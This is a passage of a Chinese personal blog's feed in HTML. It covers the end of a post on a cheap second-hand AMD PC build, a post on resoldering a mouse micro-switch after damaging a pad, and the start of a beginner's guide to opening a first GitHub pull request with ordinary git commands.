+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/001.jpg"
+width="1080"
+height="1921"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/001_hu16201524273580203150.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/001_hu848054287232696683.jpg 1024w"
+loading="lazy"
+alt="老主板"
+class="gallery-image"
+data-flex-grow="56"
+data-flex-basis="134px"
+>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/002.jpg"
+width="1324"
+height="1080"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/002_hu6842189057362546732.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/002_hu11945769914595365086.jpg 1024w"
+loading="lazy"
+alt="老CPu"
+class="gallery-image"
+data-flex-grow="122"
+data-flex-basis="294px"
+>&lt;/p>
+&lt;p>感谢多年陪伴，这麽多年下来这套配置依然能够流畅win10ltsc与办公，但是因为集显驱动没有win10支持，以及主板PCIe x16槽接触不良无法稳定加装显卡，于是便有了装新机的念头。&lt;/p>
+&lt;h2 id="硬件的购入">硬件的购入
+&lt;/h2>&lt;p>提前看了非常多的捡垃圾视频，最后确定了以下的配置：&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>配件&lt;/th>
+&lt;th>&lt;/th>
+&lt;th>价格&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>CPU&lt;/td>
+&lt;td>AMD A8-7500&lt;/td>
+&lt;td>25.97&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>显卡&lt;/td>
+&lt;td>AMD Radeon R7&lt;/td>
+&lt;td>核显&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>主板&lt;/td>
+&lt;td>映泰A68mpl&lt;/td>
+&lt;td>38&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>散热&lt;/td>
+&lt;td>寒冰100&lt;/td>
+&lt;td>17.9&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>内存&lt;/td>
+&lt;td>威刚ddr3 1600Mhz 4g *2&lt;/td>
+&lt;td>14.37&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>硬盘&lt;/td>
+&lt;td>幻隐 HC2000 256g SATA3 SSD&lt;/td>
+&lt;td>拆机&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;/td>
+&lt;td>希捷 200g HDD&lt;/td>
+&lt;td>拆机&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>电源&lt;/td>
+&lt;td>康舒PC6001 280W&lt;/td>
+&lt;td>拆机&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>机箱&lt;/td>
+&lt;td>H2&lt;/td>
+&lt;td>27.9&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>共计&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>124.14&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>即使换了新机箱，加起来的价格也不到125元！&lt;/p>
+&lt;p>另外特别说说我的固态硬盘，是23年6月国产颗粒大火的时候最低价78买的，现在24年6月卖149，赚翻了XD。&lt;/p>
+&lt;h2 id="到货装机">到货装机
+&lt;/h2>&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/003.jpg"
+width="1309"
+height="1080"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/003_hu4461175935965385873.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/003_hu3368506708340126762.jpg 1024w"
+loading="lazy"
+alt="主板"
+class="gallery-image"
+data-flex-grow="121"
+data-flex-basis="290px"
+>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/004.jpg"
+width="1588"
+height="1080"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/004_hu10174640701636906347.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/004_hu17997498380399437212.jpg 1024w"
+loading="lazy"
+alt="所有"
+class="gallery-image"
+data-flex-grow="147"
+data-flex-basis="352px"
+>&lt;/p>
+&lt;h3 id="开始装机">开始装机
+&lt;/h3>&lt;p>有条件请播放油管源，B站压缩的太狠了。。。。。。。。&lt;/p>
+&lt;p>B站源&lt;/p>
+&lt;p>【【空】第一次装机】 &lt;a class="link" href="https://www.bilibili.com/video/BV19t421j7CC" target="_blank" rel="noopener"
+>https://www.bilibili.com/video/BV19t421j7CC&lt;/a> (若只哔哩哔哩iframe禁不了自动播放)&lt;/p>
+&lt;p>Youtube&lt;/p>
+&lt;iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/Y46J1B-CdOo?si=klUA9WKxS2mcmRt0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>&lt;/iframe>
+&lt;p>成功点亮！&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/005.jpg"
+width="1768"
+height="1080"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/005_hu11620759426596531404.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/005_hu11480979878803108046.jpg 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="163"
+data-flex-basis="392px"
+>&lt;/p>
+&lt;p>彩色中文BIOS界面！居然还能用鼠标，科技感满满！再也不是原来的蓝天白云了。&lt;/p>
+&lt;p>测试没问题就装到了机箱：
+&lt;img src="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/006.jpg"
+width="1080"
+height="1921"
+srcset="https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/006_hu12328852944659909689.jpg 480w, https://blog.wuko.top/posts/2024/06/09/pczhuangji.html/006_hu15998817572996355607.jpg 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="56"
+data-flex-basis="134px"
+>&lt;/p>
+&lt;p>真难装。。。比前面还难装，主板和机箱孔位死活对不齐，最后大力出奇迹解决了。理线？盖板一盖，谁也不爱！&lt;/p>
+&lt;h3 id="体验">体验
+&lt;/h3>&lt;p>懒得重装系统了，没想到可以直接进系统并且没有任何兼容问题，要知道我用的可是精简版的Windows 10 企业版 LTSC 21H2，开机炒鸡快，爽歪歪。&lt;/p>
+&lt;p>用DDU删掉了原来的N卡驱动，到AMD官网下载了最新的驱动（A8-7600 with Radeon™ R7 Series Drivers 220623），安装之后&amp;hellip;感觉显示效果很奇怪，并且全屏进入游戏后会出现色彩异常，最后换到了一个更老的驱动才恢复正常，只能说不愧是A卡？&lt;/p>
+&lt;p>得益于双热管塔式散热，电脑桌面挂机CPU温度在3摄氏度左右，正常办公码字温度在10摄氏度，满负荷游戏在35摄氏度，均为夏天，真怕给CPU干感冒了2333。&lt;/p>
+&lt;p>SATA3接口，原来买的固态终于能满速跑了。鲁大师跑分21.5W，击败全国百分之九的人，旧电脑跑分会死机。&lt;/p>
+&lt;p>唯一担心的就是电源，280W在打游戏时非常烫，电源呼呼吹热风，但是几个月以来没有过死机蓝屏症状（除了打开AMD relive打游戏会卡死），很不错了。&lt;/p>
+&lt;h2 id="尾声">尾声
+&lt;/h2>&lt;p>文章从一月写到六月，终于是在这高考结束第二天写完了。有了新电脑后才发现，最快乐的时候不是用它打游戏，而是装机并点亮的瞬间&amp;hellip;现在经常看着桌面发呆，游戏也玩腻了&amp;hellip;&lt;/p></description></item><item><title>记：小白初试电烙铁之鼠标微动更换</title><link>https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/</link><pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/013.png" alt="Featured image of post 记：小白初试电烙铁之鼠标微动更换" />&lt;h1 id="记小白初试电烙铁之鼠标微动更换">记：小白初试电烙铁之鼠标微动更换
+&lt;/h1>&lt;blockquote>
+&lt;p>省流：翻车了，但是又救回来了&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="前言">前言
+&lt;/h2>&lt;p>在本人从十年前的红光鼠标换到现在的罗技g102之间，其实是有一年多的时间在用一个三无的二模无线鼠标（2.4Ghz+蓝牙），说实话其实还蛮好用的，除了太小（半边手都在鼠标垫上摩擦，并且我还玩OSU。。。）和太贵（价格能买一套小米无线键鼠还有剩余，何况我还用不上蓝牙）外，基本上没有缺点。&lt;/p>
+&lt;p>直到用了一年后的某一天，得益于它使用的静音微动，寿命短，左键开始罢工。勉强用了一个月后，还是下单了G102，随后这个鼠标就开始在柜子里吃灰，直到一天，偶然刷到电烙铁的视频，我的目光就投到了它的身上，于是便有了这篇文章。&lt;/p>
+&lt;h2 id="开始">开始
+&lt;/h2>&lt;p>先看下总花费吧（叠券了）：&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>物&lt;/th>
+&lt;th>价&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>907电烙铁&lt;/td>
+&lt;td>24.6 CNY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>6337含松香锡丝 0.6 mm&lt;/td>
+&lt;td>11.81 CNY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>烙铁架＋海绵＋松香&lt;/td>
+&lt;td>6.08 CNY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>吸锡器&lt;/td>
+&lt;td>0.38 CNY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>凯华方形静音微动*2&lt;/td>
+&lt;td>0.55 CNY&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>总合计&lt;/td>
+&lt;td>43.42 CNY&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>没错，全部包邮！也就是说，如果你工具齐全的话，只需要五毛多就可以换掉原先的微动，几乎零成本。可惜本人从未接触过电烙铁，遂购入全套电烙铁装备，开始了本小白的第一次焊锡。&lt;/p>
+&lt;p>等待所有东西到货以及一个空闲的周末，迫不及待拆开鼠标，和家伙们来一张合影:&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/013.png"
+width="889"
+height="649"
+srcset="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/013_hu15052263160783571128.png 480w, https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/013_hu7971297764886484854.png 1024w"
+loading="lazy"
+alt="合影"
+class="gallery-image"
+data-flex-grow="136"
+data-flex-basis="328px"
+>&lt;/p>
+&lt;h3 id="拆微动">拆微动
+&lt;/h3>&lt;p>首先给高温海绵加水，不宜太多，不然容易流得到处都是；也不要不加水就开始用，不然直接烧黑海绵，还会损害烙铁头…设定325℃，给电烙铁通电，等待烙铁头变热。往上沾点松香，烙铁头冒烟时，差不多就到了可以熔锡的温度了。&lt;/p>
+&lt;p>拉锡丝触碰烙铁头，可以一触即熔就OK。给烙铁头上一层锡，防止烙铁头与空气接触加热被氧化。固定好鼠标的电路板，有能力的可以买一个夹具台或者直接上焊台(，不建议一只手拿电路板一只手拿电烙铁，容易出事故。&lt;/p>
+&lt;p>找到鼠标微动位置，翻到背面找到对应针脚，一般是2或3个，向每一个针脚上挂一定量的锡，利用低温锡来降低电路板原有的高温锡，来回反复用烙铁头加热各个针脚上的锡直至正面微动松动，利用重力或者些许外力给微动整下来。&lt;/p>
+&lt;p>到这里任务就已经完成三分之一了，讲讲我上面步骤所踩的坑吧。&lt;/p>
+&lt;p>首先是&lt;del>犯下了&lt;/del>&lt;strong>过度加热&lt;del>之罪&lt;/del>&lt;/strong>，加热电路板时间过长，这为后面的翻车埋下了伏笔…&lt;/p>
+&lt;p>其次是没准备好焊接的环境。熔化的锡把桌垫表面烫坏了，后面垫了一张鼠标垫。还有就是应该备一个小风扇来吸走焊接产生的烟雾，偶尔一次可能还好，但为长期健康着想，还是少吸点吧&amp;hellip;&lt;/p>
+&lt;p>最后是挂的锡不宜太多，本人一开始弄了太多结果落到了其他元件针脚上&amp;hellip;清理了好久。&lt;/p>
+&lt;h3 id="清理锡安装新微动">清理锡&amp;amp;安装新微动
+&lt;/h3>&lt;p>个人认为最难的一部分，对于没有经验的小白来说可能是最耗时的部分，本人花了一个多小时才清理干净，在此讲一下本人摸索到的方法：&lt;/p>
+&lt;p>先把板子竖直立起来，有锡的那面对准拿烙铁的手，另一面也就是装微动的那面对准拿吸锡器的另一只手。先把吸锡器头怼到正面焊盘，再用烙铁加热背面的锡，待锡熔化时同时按下吸锡器和抬起烙铁，这样一个通透的焊孔就出现了，然后我就发现我的板子焊盘被我整掉了&amp;hellip;&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/014.png"
+width="519"
+height="251"
+srcset="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/014_hu16411485675956160301.png 480w, https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/014_hu18090519502763313357.png 1024w"
+loading="lazy"
+alt="焊盘脱落"
+class="gallery-image"
+data-flex-grow="206"
+data-flex-basis="496px"
+>&lt;/p>
+&lt;p>急忙上网查资料，原来正是因为我先前连续加热时间过长，高温导致了焊盘离板子而去&amp;hellip;所以&lt;strong>切忌加热时间过长&lt;/strong>！惨痛的教训：(&lt;/p>
+&lt;p>总之先把微动装上去吧，看看好不好使&amp;hellip;&lt;/p>
+&lt;p>凯华这个微动的针脚中间金属片是凸出来的，一开始试着大力出奇迹直接捅进去，结果针脚歪了也没进去，于是请出家中十年前的老虎钳扶正了针脚并且把凸出部分压了压，轻松搞定。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/015.png"
+width="512"
+height="780"
+srcset="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/015_hu15869378086521334666.png 480w, https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/015_hu10688141426459705538.png 1024w"
+loading="lazy"
+alt="装好的微动"
+class="gallery-image"
+data-flex-grow="65"
+data-flex-basis="157px"
+>&lt;/p>
+&lt;p>继续掏出烙铁，翻到板子背面给针脚上锡，覆盖焊盘略微突出即可。&lt;/p>
+&lt;p>插电，开机，轻松秒杀&amp;hellip;的情景并没有出现。&lt;/p>
+&lt;p>焊盘脱落导致了微动并没有连接到主板，左键依然无法使用。&lt;/p>
+&lt;p>于是乎，事情被搁置，直到下一个周末。&lt;/p>
+&lt;h3 id="飞线锡">飞线（锡）
+&lt;/h3>&lt;p>隔了一周，又重拾起板子。&lt;/p>
+&lt;p>用小刀找准线路，刮掉绿漆，把里面的铜线露出来，和以前一样的步骤，熔坨锡在针脚上面。&lt;/p>
+&lt;p>因为我刮的地方离针脚还蛮近，所以懒得用导线连接直接用一坨锡连接了，如果用导线连接的活，线头记得沾点松香，防止线头不沾锡。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/016.png"
+width="367"
+height="335"
+srcset="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/016_hu7532690720899092145.png 480w, https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/016_hu6014722625964940021.png 1024w"
+loading="lazy"
+alt="两坨丑丑的锡"
+class="gallery-image"
+data-flex-grow="109"
+data-flex-basis="262px"
+>&lt;/p>
+&lt;p>虽然很难看但是能用就行！装回去插到电脑上测试，解决！&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/017.png"
+width="532"
+height="459"
+srcset="https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/017_hu7293143541437960788.png 480w, https://blog.wuko.top/posts/2023/10/14/my_first_eironexperence.html/017_hu4024903931685857266.png 1024w"
+loading="lazy"
+alt="耶鼠复活了"
+class="gallery-image"
+data-flex-grow="115"
+data-flex-basis="278px"
+>&lt;/p>
+&lt;h2 id="后语">后语
+&lt;/h2>&lt;p>实践花了两个星期，但写完这篇文章花了一个月&amp;hellip;高三时间真的好宝贵= =&lt;/p>
+&lt;p>属此文以录高三生活中的忙里偷闲。&lt;/p></description></item><item><title>什么是pr?如何pr?一个面向小白的Github项目——first-contributions</title><link>https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/012.png" alt="Featured image of post 什么是pr?如何pr?一个面向小白的Github项目——first-contributions" />&lt;h1 id="什么是pr如何pr一个面向小白的github项目first-contributions">什么是pr?如何pr?一个面向小白的Github项目——first-contributions
+&lt;/h1>&lt;h2 id="前言">前言
+&lt;/h2>&lt;p>相信许多人在浏览Github时经常看到一个关键词：&lt;strong>pr&lt;/strong> ，这并不是指Adobe开发的视频剪辑工具，而是指 &lt;strong>Pull Requests&lt;/strong>，举个例子，你看到一个repo代码还有优化的空间，你就可以fork到你自己的仓库，改动后提交pr，原仓库主人会收到你的pr请求，如果他觉得你的写的不错，就会将你的分支合入到主分支，这就是pr，你可以在这里找到：&lt;a class="link" href="https://github.com/pulls" target="_blank" rel="noopener"
+>Github - Pull Requests&lt;/a>&lt;/p>
+&lt;p>相信许多像我一样的入门小白这个页面都是这样的：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/004.png"
+width="1335"
+height="651"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/004_hu14010989250856860268.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/004_hu1656104249079478069.png 1024w"
+loading="lazy"
+alt="我的pr页面"
+class="gallery-image"
+data-flex-grow="205"
+data-flex-basis="492px"
+>&lt;/p>
+&lt;p>那么，有没有办法来亲身体验一次pr的整个流程呢？这就是我们今天要了解的一个仓库：&lt;a class="link" href="https://github.com/firstcontributions/first-contributions" target="_blank" rel="noopener"
+>first-contributions&lt;/a>&lt;/p>
+&lt;p>该仓库也有中文文档：&lt;a class="link" href="https://github.com/firstcontributions/first-contributions/blob/main/translations/README.zh-cn.md" target="_blank" rel="noopener"
+>zh-cn&lt;/a>，可参考该文档。&lt;/p>
+&lt;p>在开始前，请确保你的设备能够使用 &lt;strong>git&lt;/strong> 命令。&lt;/p>
+&lt;h2 id="开始">开始
+&lt;/h2>&lt;h3 id="1github建立分支仓库">1，Github建立分支仓库
+&lt;/h3>&lt;p>登录你的GitHub账号，打开该仓库地址：&lt;a class="link" href="https://github.com/firstcontributions/first-contributions" target="_blank" rel="noopener"
+>这里&lt;/a>&lt;/p>
+&lt;p>点击 &lt;strong>Fork&lt;/strong>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/005.png"
+width="576"
+height="209"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/005_hu9484221987015226148.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/005_hu18097221328727928672.png 1024w"
+loading="lazy"
+alt="Fork"
+class="gallery-image"
+data-flex-grow="275"
+data-flex-basis="661px"
+>&lt;/p>
+&lt;p>Fork之后转到你Fork的仓库，点击绿色的 &lt;strong>Code&lt;/strong> 按钮，选择 HTTPS或SSH。&lt;/p>
+&lt;p>这里以https来举例：&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/006.png"
+width="637"
+height="467"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/006_hu16024135594286101715.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/006_hu7666734949517100138.png 1024w"
+loading="lazy"
+alt="Code"
+class="gallery-image"
+data-flex-grow="136"
+data-flex-basis="327px"
+>&lt;/p>
+&lt;p>点击 &lt;strong>Https&lt;/strong> ，点击复制按钮或者自行复制。&lt;/p>
+&lt;h3 id="2克隆仓库并建立新分支">2，克隆仓库并建立新分支
+&lt;/h3>&lt;p>在任意位置打开命令行（这里用的是Git Bash）&lt;/p>
+&lt;p>【1】&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/007.png"
+width="811"
+height="352"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/007_hu8615227977600004274.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/007_hu9720836014958942318.png 1024w"
+loading="lazy"
+alt="输入复制的链接"
+class="gallery-image"
+data-flex-grow="230"
+data-flex-basis="552px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl"> git clone &lt;span class="o">[&lt;/span>你复制的链接&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在进度走到100%后，使用切换目录命令进入 &lt;strong>first-contributions&lt;/strong> 。&lt;/p>
+&lt;p>【2】&lt;/p>
+&lt;p>Windows/Linux:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> first-contributions
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>【3】&lt;/p>
+&lt;p>创建并切换到一个新分支：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git checkout -b &lt;span class="o">[&lt;/span>分支名&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>注：分支名建议以 &lt;strong>add-&lt;/strong> 开头&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/008.png"
+width="595"
+height="377"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/008_hu9347086735821355609.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/008_hu17234723871075457494.png 1024w"
+loading="lazy"
+alt="三个命令演示"
+class="gallery-image"
+data-flex-grow="157"
+data-flex-basis="378px"
+>&lt;/p>
+&lt;h3 id="3添加自己到贡献者列表并推送">3，添加自己到贡献者列表并推送
+&lt;/h3>&lt;p>使用任意文本编辑器打开目录下的 &lt;strong>Contributors.md&lt;/strong> 文件，建议使用支持Markdown格式的编辑器（如VS code），请勿使用word。&lt;/p>
+&lt;p>在末尾以MD格式填入你的名字和Github主页：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">&lt;span class="k">-&lt;/span> [&lt;span class="nt">名字&lt;/span>](&lt;span class="na">你的主页地址&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这会将你的名字与主页添加到贡献者列表。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/009.png"
+width="800"
+height="696"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/009_hu18139103292196012163.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/009_hu17651049000519601989.png 1024w"
+loading="lazy"
+alt="插入列表"
+class="gallery-image"
+data-flex-grow="114"
+data-flex-basis="275px"
+>&lt;/p>
+&lt;p>【1】&lt;/p>
+&lt;p>使用 &lt;strong>git status&lt;/strong> 查看当前状态：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git status
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>【2】&lt;/p>
+&lt;p>添加改动文件：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git add Contributors.md
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里偷懒用了 &lt;strong>.&lt;/strong> ，即添加所有有改动的文件。&lt;/p>
+&lt;p>【3】&lt;/p>
+&lt;p>提交改动的文件：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git commit -m &lt;span class="s2">&amp;#34;Add [Yourname] to Contributors list&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>记得把空改了。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010.png"
+width="566"
+height="233"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010_hu12489552771555068903.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010_hu3757749498967544742.png 1024w"
+loading="lazy"
+alt="添加改动"
+class="gallery-image"
+data-flex-grow="242"
+data-flex-basis="583px"
+>&lt;/p>
+&lt;h3 id="4推送然后合并">4，推送，然后合并
+&lt;/h3>&lt;p>【1】&lt;/p>
+&lt;p>推送你的修改到你的仓库，此时一个新分支在GitHub被创建：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git push origin add-&lt;span class="o">[&lt;/span>你自己的名字&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>【2】&lt;/p>
+&lt;p>打开你克隆的仓库的主页，你会看到一个绿色的按钮 &lt;strong>Compare &amp;amp; pull request&lt;/strong> 。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010-2.png"
+width="1218"
+height="557"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010-2_hu8588748963163047234.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/010-2_hu16425514935821317124.png 1024w"
+loading="lazy"
+alt="push"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="524px"
+>&lt;/p>
+&lt;p>点击它，进入pr界面，此页面显示了一些相关的信息，默认无需更改。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/011.png"
+width="955"
+height="625"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/011_hu15401499148015429954.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/011_hu8730969834142295956.png 1024w"
+loading="lazy"
+alt="pr界面"
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="366px"
+>&lt;/p>
